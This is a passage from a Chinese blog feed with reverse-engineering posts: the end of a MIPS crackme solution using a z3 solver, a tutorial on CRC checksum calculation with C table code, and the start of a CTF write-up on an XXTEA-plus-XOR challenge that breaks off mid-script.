class="number">-0x58e9</span>*a[<span class="number">5</span>] +<span class="number">0xbebe</span>*a[<span class="number">6</span>] +<span class="number">0x1820</span>*a[<span class="number">7</span>] <span class="number">-0xd7b9</span>*a[<span class="number">8</span>] <span class="number">-0xb21f</span>*a[<span class="number">9</span>] <span class="number">-0x76a0</span>*a[<span class="number">10</span>] +<span class="number">0xc60d</span>*a[<span class="number">11</span>] +<span class="number">0x168f</span>*a[<span class="number">12</span>] +<span class="number">0x2a96</span>*a[<span class="number">13</span>] +<span class="number">0x31d6</span>*a[<span class="number">14</span>] <span class="number">-0x4b88</span>*a[<span class="number">15</span>] == <span class="number">0xd08e2</span>)</span><br><span class="line">s.add(<span class="number">0xffff1bae</span>*a[<span class="number">0</span>] <span class="number">-0xc7d4</span>*a[<span class="number">1</span>] <span class="number">-0x1554</span>*a[<span class="number">2</span>] +<span class="number">0x7eea</span>*a[<span class="number">3</span>] <span class="number">-0x684d</span>*a[<span class="number">4</span>] +<span class="number">0x6adb</span>*a[<span class="number">5</span>] +<span class="number">0x8534</span>*a[<span class="number">6</span>] <span class="number">-0x3a36</span>*a[<span class="number">7</span>] +<span class="number">0x29f0</span>*a[<span class="number">8</span>] +<span class="number">0xd3f2</span>*a[<span class="number">9</span>] <span class="number">-0x23e5</span>*a[<span class="number">10</span>] <span class="number">-0x6540</span>*a[<span class="number">11</span>] +<span class="number">0xbcd3</span>*a[<span class="number">12</span>] <span class="number">-0xef9b</span>*a[<span class="number">13</span>] +<span class="number">0xefdb</span>*a[<span class="number">14</span>] <span class="number">-0x774e</span>*a[<span class="number">15</span>] == <span class="number">0x178803</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item in a:</span><br><span class="line">    s.add(item &gt; <span class="number">0</span>, item &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">16</span>):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print(<span class="string">''.join(map(chr, flag)))</span></span><br></pre></td></tr></tbody></table></figure><p>注意负数要换成十六进制</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650613838317.png" alt></p><h1 id="参考"><a class="header-anchor" href="#参考">¶</a>参考</h1><p><a href="https://blog.csdn.net/m0_46362499/article/details/107629918">https://blog.csdn.net/m0_46362499/article/details/107629918</a></p><p><a href="https://cloud.tencent.com/developer/article/1123681">https://cloud.tencent.com/developer/article/1123681</a></p><p><a href="https://cq674350529.github.io/2018/05/07/Solve-baby-mips-with-angr/">https://cq674350529.github.io/2018/05/07/Solve-baby-mips-with-angr/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mips架构逆向初探&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>CRC算法</title>
    <link href="https://gift1a.github.io/2022/04/21/CRC%E7%AE%97%E6%B3%95/"/>
    <id>https://gift1a.github.io/2022/04/21/CRC%E7%AE%97%E6%B3%95/</id>
    <published>2022-04-21T08:32:35.000Z</published>
    <updated>2022-04-27T06:01:24.883Z</updated>
    
    <content type="html"><![CDATA[<p>CRC校验算法</p><span id="more"></span> <p><a href="https://www.52pojie.cn/thread-783879-1-1.html">https://www.52pojie.cn/thread-783879-1-1.html</a></p><h1 id="0x00-CRC校验原理"><a class="header-anchor" href="#0x00-CRC校验原理">¶</a>0x00-CRC校验原理</h1><p>CRC校验即循环冗余判断，是基于数据计算一组的校验码，用于核对数据传输过程中是否被更改或传输错误。首先看两个概念，后续会用到</p><ul><li><p>模2除法：也叫模2运算，就是结果除2后取余数。 数据传输过程中是否被更改或传输错误。首先看两个概念，后续会用到</p></li><li><p>多项式与二进制：二进制可以表示成多项式的形式，比如二进制1101可以表示为：<br>$$<br>x<sup>3+x</sup>2+x^0<br>$$<br>1011表示为：<br>$$<br>x<sup>3+x</sup>1+x^0<br>$$</p></li></ul><p>CRC校验本质上是选取一个合适的除数，要进行校验的数据是除数，然后做模2除法，得到的余数就是CRC校验值</p><p>最终传输的数据是我们的数据加上CRC校验值，而CRC的数据存储在数据的末尾，添加的位数根据除数来判断</p><blockquote><p><strong>余数位必须比除数少一位，如果不够前面加0补齐</strong></p></blockquote><p><img src="/2022/04/21/CRC%E7%AE%97%E6%B3%95/20170622115737528.png" alt="计算过程"></p><h2 id="CRC生成多项式"><a class="header-anchor" href="#CRC生成多项式">¶</a>CRC生成多项式</h2><p>通常我们把选出的除数称为生成多项式，对于我们来说，直接拿来使用即可</p><p><img src="/2022/04/21/CRC%E7%AE%97%E6%B3%95/1651021828457.png" alt="标准CRC生成多项式"></p><p>因为生成多项式的最高位肯定为1，所以在简记式中可以去掉，所以位宽等于多项式对应的二进制的位数-1，CRC8本来是9位，但是省去最高位1，得到八位，所以CRC校验值为8位</p><h1 id="0x01-计算过程"><a class="header-anchor" href="#0x01-计算过程">¶</a>0x01-计算过程</h1><h2 id="根据CRC原理实现校验"><a class="header-anchor" href="#根据CRC原理实现校验">¶</a>根据CRC原理实现校验</h2><p>这里我们以CRC16为例，即选取生成多项式为0x8005</p><ol><li>在数据末尾添加十六位CRC校验值0</li><li>如果最高位为1，数据左移后异或生成的多项式</li><li>如果数据最高位为0，直接左移</li><li>这样得到的低十六位就是我们的CRC校验值</li></ol><p>这样就完成了一个字节的校验</p><p><img src="/2022/04/21/CRC%E7%AE%97%E6%B3%95/1651022682175.png" alt="工程中常用CRC校验过程"></p><p>CRC校验有很多种类型，这上面介绍了不同的计算类型</p><p><img src="/2022/04/21/CRC%E7%AE%97%E6%B3%95/1651022865226.png" alt></p><h2 id="代码实现"><a class="header-anchor" href="#代码实现">¶</a>代码实现</h2><p>以CRC16为例</p><p>因为一个字符是8位，所以CRC16本身会左移8位，所以在开始前 需要先左移8位，这样得到的才会是十六位数据</p><h1 id="0x01-CRC检验过程改进"><a class="header-anchor" href="#0x01-CRC检验过程改进">¶</a>0x01-CRC检验过程改进</h1><p>CRC查表法</p><p>由于每一个字节都需要进行8次的判断、移位和异或操作。如果使用查表法</p><p>因为加密的是一个字符，最多就256个，也就是8位，所以使用查表法效率较高</p><p>下面是生成CRC-8表的代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//每个字符传进来进行CRC8计算</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">crc_high_first</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ptr)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crc = ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &gt; <span class="number">0</span>; --i)   <span class="comment">/* 下面这段计算过程与计算一个字节crc一样 */</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (crc &amp; <span class="number">0x80</span>)</span><br><span class="line">            crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x31</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            crc = (crc &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> (crc);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">create_crc_table</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == (i % <span class="number">16</span>))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        j = i &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%.2x, "</span>, crc_high_first(j));  <span class="comment">/*依次计算每个字节的crc校验值*/</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    create_crc_table();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>CRC8查表法</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> crc_table[] =</span><br><span class="line">{</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x31</span>,<span class="number">0x62</span>,<span class="number">0x53</span>,<span class="number">0xc4</span>,<span class="number">0xf5</span>,<span class="number">0xa6</span>,<span class="number">0x97</span>,<span class="number">0xb9</span>,<span class="number">0x88</span>,<span class="number">0xdb</span>,<span class="number">0xea</span>,<span class="number">0x7d</span>,<span class="number">0x4c</span>,<span class="number">0x1f</span>,<span class="number">0x2e</span>,<span class="number">0x43</span>,<span class="number">0x72</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x87</span>,<span class="number">0xb6</span>,<span class="number">0xe5</span>,<span class="number">0xd4</span>,<span class="number">0xfa</span>,<span class="number">0xcb</span>,<span class="number">0x98</span>,<span class="number">0xa9</span>,<span class="number">0x3e</span>,<span class="number">0x0f</span>,<span class="number">0x5c</span>,<span class="number">0x6d</span>,<span class="number">0x86</span>,<span class="number">0xb7</span>,<span class="number">0xe4</span>,<span class="number">0xd5</span>,<span class="number">0x42</span>,<span class="number">0x73</span>,<span class="number">0x20</span>,<span class="number">0x11</span>,<span class="number">0x3f</span>,<span class="number">0x0e</span>,<span class="number">0x5d</span>,<span class="number">0x6c</span>,<span class="number">0xfb</span>,<span class="number">0xca</span>,<span class="number">0x99</span>,<span class="number">0xa8</span>,<span class="number">0xc5</span>,<span class="number">0xf4</span>,<span class="number">0xa7</span>,<span class="number">0x96</span>,<span class="number">0x01</span>,<span class="number">0x30</span>,<span class="number">0x63</span>,<span class="number">0x52</span>,<span class="number">0x7c</span>,<span class="number">0x4d</span>,<span class="number">0x1e</span>,<span class="number">0x2f</span>,<span class="number">0xb8</span>,<span class="number">0x89</span>,<span class="number">0xda</span>,<span class="number">0xeb</span>,<span class="number">0x3d</span>,<span class="number">0x0c</span>,<span class="number">0x5f</span>,<span class="number">0x6e</span>,<span class="number">0xf9</span>,<span class="number">0xc8</span>,<span class="number">0x9b</span>,<span class="number">0xaa</span>,<span class="number">0x84</span>,<span class="number">0xb5</span>,<span class="number">0xe6</span>,<span class="number">0xd7</span>,<span class="number">0x40</span>,<span class="number">0x71</span>,<span class="number">0x22</span>,<span class="number">0x13</span>,<span class="number">0x7e</span>,<span class="number">0x4f</span>,<span class="number">0x1c</span>,<span class="number">0x2d</span>,<span class="number">0xba</span>,<span class="number">0x8b</span>,<span class="number">0xd8</span>,<span class="number">0xe9</span>,<span class="number">0xc7</span>,<span class="number">0xf6</span>,<span class="number">0xa5</span>,<span class="number">0x94</span>,<span class="number">0x03</span>,<span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x50</span>,<span class="number">0xbb</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xe8</span>,<span class="number">0x7f</span>,<span class="number">0x4e</span>,<span class="number">0x1d</span>,<span class="number">0x2c</span>,<span class="number">0x02</span>,<span class="number">0x33</span>,<span class="number">0x60</span>,<span class="number">0x51</span>,<span class="number">0xc6</span>,<span class="number">0xf7</span>,<span class="number">0xa4</span>,<span class="number">0x95</span>,<span class="number">0xf8</span>,<span class="number">0xc9</span>,<span class="number">0x9a</span>,<span class="number">0xab</span>,<span class="number">0x3c</span>,<span class="number">0x0d</span>,<span class="number">0x5e</span>,<span class="number">0x6f</span>,<span class="number">0x41</span>,<span class="number">0x70</span>,<span class="number">0x23</span>,<span class="number">0x12</span>,<span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xe7</span>,<span class="number">0xd6</span>,<span class="number">0x7a</span>,<span class="number">0x4b</span>,<span class="number">0x18</span>,<span class="number">0x29</span>,<span class="number">0xbe</span>,<span class="number">0x8f</span>,<span class="number">0xdc</span>,<span class="number">0xed</span>,<span class="number">0xc3</span>,<span class="number">0xf2</span>,<span class="number">0xa1</span>,<span class="number">0x90</span>,<span class="number">0x07</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x54</span>,<span class="number">0x39</span>,<span class="number">0x08</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xfd</span>,<span class="number">0xcc</span>,<span class="number">0x9f</span>,<span class="number">0xae</span>,<span class="number">0x80</span>,<span class="number">0xb1</span>,<span class="number">0xe2</span>,<span class="number">0xd3</span>,<span class="number">0x44</span>,<span class="number">0x75</span>,<span class="number">0x26</span>,<span class="number">0x17</span>,<span class="number">0xfc</span>,<span class="number">0xcd</span>,<span class="number">0x9e</span>,<span class="number">0xaf</span>,<span class="number">0x38</span>,<span class="number">0x09</span>,<span class="number">0x5a</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x74</span>,<span class="number">0x27</span>,<span class="number">0x16</span>,<span class="number">0x81</span>,<span class="number">0xb0</span>,<span class="number">0xe3</span>,<span class="number">0xd2</span>,<span class="number">0xbf</span>,<span class="number">0x8e</span>,<span class="number">0xdd</span>,<span class="number">0xec</span>,<span class="number">0x7b</span>,<span class="number">0x4a</span>,<span class="number">0x19</span>,<span class="number">0x28</span>,<span class="number">0x06</span>,<span class="number">0x37</span>,<span class="number">0x64</span>,<span class="number">0x55</span>,<span class="number">0xc2</span>,<span class="number">0xf3</span>,<span class="number">0xa0</span>,<span class="number">0x91</span>,<span class="number">0x47</span>,<span class="number">0x76</span>,<span class="number">0x25</span>,<span class="number">0x14</span>,<span class="number">0x83</span>,<span class="number">0xb2</span>,<span class="number">0xe1</span>,<span class="number">0xd0</span>,<span class="number">0xfe</span>,<span class="number">0xcf</span>,<span class="number">0x9c</span>,<span class="number">0xad</span>,<span class="number">0x3a</span>,<span class="number">0x0b</span>,<span class="number">0x58</span>,<span class="number">0x69</span>,<span class="number">0x04</span>,<span class="number">0x35</span>,<span class="number">0x66</span>,<span class="number">0x57</span>,<span class="number">0xc0</span>,<span class="number">0xf1</span>,<span class="number">0xa2</span>,<span class="number">0x93</span>,<span class="number">0xbd</span>,<span class="number">0x8c</span>,<span class="number">0xdf</span>,<span class="number">0xee</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x1b</span>,<span class="number">0x2a</span>,<span class="number">0xc1</span>,<span class="number">0xf0</span>,<span class="number">0xa3</span>,<span class="number">0x92</span>,<span class="number">0x05</span>,<span class="number">0x34</span>,<span class="number">0x67</span>,<span class="number">0x56</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,<span class="number">0x1a</span>,<span class="number">0x2b</span>,<span class="number">0xbc</span>,<span class="number">0x8d</span>,<span class="number">0xde</span>,<span class="number">0xef</span>,<span class="number">0x82</span>,<span class="number">0xb3</span>,<span class="number">0xe0</span>,<span class="number">0xd1</span>,<span class="number">0x46</span>,<span class="number">0x77</span>,<span class="number">0x24</span>,<span class="number">0x15</span>,<span class="number">0x3b</span>,<span class="number">0x0a</span>,<span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0xff</span>,<span class="number">0xce</span>,<span class="number">0x9d</span>,<span class="number">0xac</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">//每个字符传进来进行CRC8计算</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">crc_high_first</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ptr)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crc = ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &gt; <span class="number">0</span>; --i)   <span class="comment">/* 下面这段计算过程与计算一个字节crc一样 */</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (crc &amp; <span class="number">0x80</span>)</span><br><span class="line">            crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x31</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            crc = (crc &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> (crc);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">create_crc_table</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == (i % <span class="number">16</span>))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        j = i &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%.2x, "</span>, crc_high_first(j));  <span class="comment">/*依次计算每个字节的crc校验值*/</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_crc_table</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crc = <span class="number">0x00</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key = <span class="number">0x31</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, crc_table[crc ^ <span class="number">0x31</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crc_8_encode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crc=<span class="number">0x00</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key = <span class="number">0x31</span>;</span><br><span class="line">    crc ^= key;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (crc &amp; <span class="number">0x80</span>)</span><br><span class="line">        {</span><br><span class="line">            crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x31</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            crc &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x"</span>, crc);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//create_crc_table();</span></span><br><span class="line">    find_crc_table();</span><br><span class="line">    crc_8_encode();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>CRC16和CRC32也同理</p><p>只是初始时移动的位数改变</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CRC校验算法&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题记录</title>
    <link href="https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-04-18T06:51:41.000Z</published>
    <updated>2022-04-20T05:25:59.456Z</updated>
    
    <content type="html"><![CDATA[<p>Buuctf刷题记录</p><span id="more"></span> <h1 id="红帽杯-XX"><a class="header-anchor" href="#红帽杯-XX">¶</a>红帽杯-XX</h1><h2 id="考点"><a class="header-anchor" href="#考点">¶</a>考点</h2><p>xxtea、异或、换位</p><h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2><p>整个过程就是取前四个输入作为密钥，先进行XXTEA加密，然后位置互换混淆，最后进行异或加密</p><h3 id="取密钥"><a class="header-anchor" href="#取密钥">¶</a>取密钥</h3><p>这里判断取出前四位，判断是否为数组内的元素，因为如果不是的话，最后V11=V14退出程序</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329798015.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329952441.png" alt="v6元素"></p><p>取出地址中存储的字符，保证其不为0，下面那个循环是将取出的key末尾填充0</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330081892.png" alt></p><p>我们的key是int型，这里传参时强制转为char型</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330189857.png" alt></p><p>函数内部起始段是将我们传入的key转为int型，转换大小端序，因为原本是flag，转为int之后就变成了galf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330259305.png" alt></p><p>然后xxtea加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330294507.png" alt></p><h3 id="打乱位置"><a class="header-anchor" href="#打乱位置">¶</a>打乱位置</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330367612.png" alt></p><h3 id="异或"><a class="header-anchor" href="#异或">¶</a>异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330508850.png" alt="index初始值"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330454278.png" alt></p><p>这段的逻辑就是只要是3的倍数就取出来异或，index从1开始，所以0、1、2下标的字符都不会被加密，3、4、5进行一次加密，异或的值为下标为0的enc_flag，6、7、8则两次，异或的值为下标为0、1的加密后的字符，依次往后，直到21、22、23，此时异或前六位加密字符</p><h2 id="脚本"><a class="header-anchor" href="#脚本">¶</a>脚本</h2><p>xxtea</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y<span class="meta-string">&lt;&lt;2) + (xxtea_y&gt;</span>&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* xxtea_origin, <span class="keyword">int</span> xxtea_n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> xxtea_key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">uint32_t</span> xxtea_y, xxtea_z, xxtea_sum;</span><br><span class="line">    <span class="keyword">unsigned</span> xxtea_p, xxtea_rounds, xxtea_e;</span><br><span class="line">    <span class="keyword">if</span> (xxtea_n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = <span class="number">0</span>;</span><br><span class="line">        xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_sum += xxtea_DELTA;</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = <span class="number">0</span>; xxtea_p &lt; xxtea_n - <span class="number">1</span>; xxtea_p++)</span><br><span class="line">            {</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p + <span class="number">1</span>];</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;</span><br><span class="line">            }</span><br><span 